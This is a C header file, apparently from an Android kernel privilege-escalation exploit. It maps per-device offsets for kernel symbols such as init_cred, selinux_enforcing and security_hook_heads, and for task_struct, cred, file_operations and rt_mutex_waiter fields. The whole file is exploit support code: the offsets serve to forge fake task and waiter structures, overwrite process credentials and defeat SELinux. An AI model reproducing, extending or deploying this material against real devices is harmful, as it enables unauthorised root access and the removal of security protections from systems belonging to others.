#ifndef RUNTIME_STRUCT_OFFSETS_H
#define RUNTIME_STRUCT_OFFSETS_H

#include "../kernels/offsets.h"

extern const struct kernel_offsets *active_offsets;

#define _RSO(field, fallback) (active_offsets && active_offsets->field ? active_offsets->field : (fallback))
#define _RSO_64(field, fallback) ((uint64_t)_RSO(field, fallback))
#define _RSO_IMAGE(field, fallback) \
  (KIMAGE_TEXT_BASE + _RSO_64(field, fallback))

/* Override symbol macros with the selected device entry. */
#undef INIT_TASK
#undef INIT_CRED
#undef ROOT_TASK_GROUP
#undef SELINUX_ENFORCING
#undef SELINUX_BLOB_SIZES
#undef SECURITY_HOOK_HEADS
#undef KMALLOC_CACHES
#undef ANON_PIPE_BUF_OPS
#undef ASHMEM_MISC_FOPS
#undef ASHMEM_FOPS
#undef ASHMEM_IOCTL
#undef ASHMEM_COMPAT_IOCTL
#undef ASHMEM_MMAP
#undef ASHMEM_OPEN
#undef ASHMEM_RELEASE
#undef ASHMEM_SHOW_FDINFO
#undef CONFIGFS_READ_ITER
#undef CONFIGFS_BIN_WRITE_ITER
#undef COPY_SPLICE_READ
#undef NOOP_LLSEEK
#undef SLIDE_NFULNL_LOGGER_IMAGE
#undef SLIDE_LOGGERS_0_1_IMAGE
#undef SLIDE_RANDOM_BOOT_ID_DATA_IMAGE
#undef SLIDE_INIT_TASK_IMAGE
#undef SLIDE_ROOT_TASK_GROUP_IMAGE
#undef SLIDE_SYSCTL_BOOTID_IMAGE

#define INIT_TASK           _RSO_IMAGE(off_init_task, INIT_TASK_OFF)
#define INIT_CRED           _RSO_IMAGE(off_init_cred, INIT_CRED_OFF)
#define ROOT_TASK_GROUP     _RSO_IMAGE(off_root_task_group, ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING   _RSO_IMAGE(off_selinux_enforcing, SELINUX_ENFORCING_OFF)
#define SELINUX_BLOB_SIZES  _RSO_IMAGE(off_selinux_blob_sizes, SELINUX_BLOB_SIZES_OFF)
#define SECURITY_HOOK_HEADS _RSO_IMAGE(off_security_hook_heads, SECURITY_HOOK_HEADS_OFF)
#define KMALLOC_CACHES      _RSO_IMAGE(off_kmalloc_caches, KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS   _RSO_IMAGE(off_anon_pipe_buf_ops, ANON_PIPE_BUF_OPS_OFF)
#define ASHMEM_MISC_FOPS    _RSO_IMAGE(off_ashmem_misc_fops, ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS         _RSO_IMAGE(off_ashmem_fops, ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL        _RSO_IMAGE(off_ashmem_ioctl, ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL _RSO_IMAGE(off_ashmem_compat_ioctl, ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP         _RSO_IMAGE(off_ashmem_mmap, ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN         _RSO_IMAGE(off_ashmem_open, ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE      _RSO_IMAGE(off_ashmem_release, ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO  _RSO_IMAGE(off_ashmem_show_fdinfo, ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER      _RSO_IMAGE(off_configfs_read_iter, CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER _RSO_IMAGE(off_configfs_bin_write_iter, CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ    _RSO_IMAGE(off_copy_splice_read, COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK         _RSO_IMAGE(off_noop_llseek, NOOP_LLSEEK_OFF)

#define SLIDE_NFULNL_LOGGER_IMAGE \
  _RSO_IMAGE(off_slide_nfulnl_logger, SLIDE_NFULNL_LOGGER_OFF)
#define SLIDE_LOGGERS_0_1_IMAGE \
  _RSO_IMAGE(off_slide_loggers_0_1, SLIDE_LOGGERS_0_1_OFF)
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE \
  _RSO_IMAGE(off_slide_boot_id, SLIDE_RANDOM_BOOT_ID_DATA_OFF)
#define SLIDE_INIT_TASK_IMAGE _RSO_IMAGE(off_init_task, INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE \
  _RSO_IMAGE(off_root_task_group, ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE \
  _RSO_IMAGE(off_slide_boot_id, SLIDE_SYSCTL_BOOTID_OFF)

#undef INIT_TASK_TASKS
#undef SECURITY_CAPABLE_HEAD
#define INIT_TASK_TASKS (INIT_TASK + TASK_TASKS_OFF)
#define SECURITY_CAPABLE_HEAD (SECURITY_HOOK_HEADS + 0x40)

#undef FAKE_TASK_USAGE_OFF
#undef FAKE_TASK_PRIO_OFF
#undef FAKE_TASK_NORMAL_PRIO_OFF
#undef FAKE_TASK_TASK_GROUP_OFF
#undef FAKE_TASK_PI_LOCK_OFF
#undef FAKE_TASK_PI_WAITERS_OFF
#undef FAKE_TASK_PI_TOP_TASK_OFF
#undef FAKE_TASK_PI_BLOCKED_ON_OFF
#undef TASK_PID_OFF
#undef TASK_TGID_OFF
#undef TASK_ATOMIC_FLAGS_OFF
#undef TASK_REAL_CRED_OFF
#undef TASK_CRED_OFF
#undef TASK_COMM_OFF
#undef TASK_TASKS_OFF
#undef TASK_SECCOMP_OFF

#define FAKE_TASK_USAGE_OFF          _RSO(task_usage, 0x40)
#define FAKE_TASK_PRIO_OFF           _RSO(task_prio, 0x94)
#define FAKE_TASK_NORMAL_PRIO_OFF    _RSO(task_normal_prio, 0x9C)
#define FAKE_TASK_TASK_GROUP_OFF     _RSO(task_sched_task_group, 0x420)
#define FAKE_TASK_PI_LOCK_OFF        _RSO(task_pi_lock, 0x9EC)
#define FAKE_TASK_PI_WAITERS_OFF     _RSO(task_pi_waiters, 0xA00)
#define FAKE_TASK_PI_TOP_TASK_OFF    _RSO(task_pi_top_task, 0xA10)
#define FAKE_TASK_PI_BLOCKED_ON_OFF  _RSO(task_pi_blocked_on, 0xA18)
#define TASK_PID_OFF             _RSO(task_pid, 0x708)
#define TASK_TGID_OFF            _RSO(task_tgid, 0x70C)
#define TASK_ATOMIC_FLAGS_OFF    _RSO(task_atomic_flags, 0x6C8)
#define TASK_REAL_CRED_OFF       _RSO(task_real_cred, 0x8F8)
#define TASK_CRED_OFF            _RSO(task_cred, 0x900)
#define TASK_COMM_OFF            _RSO(task_comm, 0x910)
#define TASK_TASKS_OFF           _RSO(task_tasks, 0x638)
#define TASK_SECCOMP_OFF         _RSO(task_seccomp, 0x9C8)

/* rt_mutex_waiter: 5.15 uses tree_entry/pi_tree_entry with a shared
 * prio/deadline pair; 6.x uses tree/pi_tree with split prio/deadline
 * fields. 0 in the offsets table keeps the target.h 6.x defaults. */
#undef FAKE_WAITER_TREE_PRIO_OFF
#undef FAKE_WAITER_TREE_DEADLINE_OFF
#undef FAKE_WAITER_PI_TREE_ENTRY_OFF
#undef FAKE_WAITER_PI_TREE_PRIO_OFF
#undef FAKE_WAITER_PI_TREE_DEADLINE_OFF
#undef FAKE_WAITER_TASK_OFF
#undef FAKE_WAITER_LOCK_OFF
#undef FAKE_WAITER_WAKE_STATE_OFF
#undef FAKE_WAITER_WW_CTX_OFF

#define FAKE_WAITER_TREE_PRIO_OFF         _RSO(waiter_tree_prio, 0x18)
#define FAKE_WAITER_TREE_DEADLINE_OFF     _RSO(waiter_tree_deadline, 0x20)
#define FAKE_WAITER_PI_TREE_ENTRY_OFF     _RSO(waiter_pi_tree, 0x28)
#define FAKE_WAITER_PI_TREE_PRIO_OFF      _RSO(waiter_pi_tree_prio, 0x40)
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF  _RSO(waiter_pi_tree_deadline, 0x48)
#define FAKE_WAITER_TASK_OFF              _RSO(waiter_task, 0x50)
#define FAKE_WAITER_LOCK_OFF              _RSO(waiter_lock, 0x58)
#define FAKE_WAITER_WAKE_STATE_OFF        _RSO(waiter_wake_state, 0x60)
#define FAKE_WAITER_WW_CTX_OFF            _RSO(waiter_ww_ctx, 0x68)

#undef CRED_UID_OFF
#undef CRED_SECUREBITS_OFF
#undef CRED_CAPS_OFF
#undef CRED_SECURITY_OFF
#define CRED_UID_OFF        _RSO(cred_uid, 8)
#define CRED_SECUREBITS_OFF _RSO(cred_securebits, 40)
#define CRED_CAPS_OFF       _RSO(cred_caps, 48)
#define CRED_SECURITY_OFF   _RSO(cred_security, 128)

/* file_operations: 5.15/6.6/6.12 slot offsets differ (6.12 gained one
 * pointer before unlocked_ioctl; 5.15 still has the legacy read/write). */
#undef FOPS_LLSEEK_OFF
#undef FOPS_READ_OFF
#undef FOPS_WRITE_OFF
#undef FOPS_READ_ITER_OFF
#undef FOPS_WRITE_ITER_OFF
#undef FOPS_IOCTL_OFF
#undef FOPS_COMPAT_IOCTL_OFF
#undef FOPS_MMAP_OFF
#undef FOPS_OPEN_OFF
#undef FOPS_RELEASE_OFF
#undef FOPS_SPLICE_READ_OFF
#undef FOPS_SHOW_FDINFO_OFF
#define FOPS_LLSEEK_OFF        _RSO(fops_llseek, 0x08)
#define FOPS_READ_OFF          _RSO(fops_read, 0x10)
#define FOPS_WRITE_OFF         _RSO(fops_write, 0x18)
#define FOPS_READ_ITER_OFF     _RSO(fops_read_iter, 0x20)
#define FOPS_WRITE_ITER_OFF    _RSO(fops_write_iter, 0x28)
#define FOPS_IOCTL_OFF         _RSO(fops_ioctl, 0x48)
#define FOPS_COMPAT_IOCTL_OFF  _RSO(fops_compat_ioctl, 0x50)
#define FOPS_MMAP_OFF          _RSO(fops_mmap, 0x58)
#define FOPS_OPEN_OFF          _RSO(fops_open, 0x68)
#define FOPS_RELEASE_OFF       _RSO(fops_release, 0x78)
#define FOPS_SPLICE_READ_OFF   _RSO(fops_splice_read, 0xb8)
#define FOPS_SHOW_FDINFO_OFF   _RSO(fops_show_fdinfo, 0xd8)

/* struct page / mm_struct. */
#undef STRUCT_PAGE_SIZE
#undef STRUCT_PAGE_COMPOUND_HEAD_OFF
#undef STRUCT_SLAB_CACHE_OFF
#undef STRUCT_PAGE_TYPE_OFF
#undef MM_STRUCT_SZ
#define STRUCT_PAGE_SIZE              _RSO(struct_page_size, 0x40)
#define STRUCT_PAGE_COMPOUND_HEAD_OFF _RSO(struct_page_compound_head, 0x08)
#define STRUCT_SLAB_CACHE_OFF         _RSO(struct_slab_cache, 0x08)
#define STRUCT_PAGE_TYPE_OFF          _RSO(struct_page_type, 0x30)
#define MM_STRUCT_SZ                  _RSO(struct_mm_struct, 0x500)

#endif
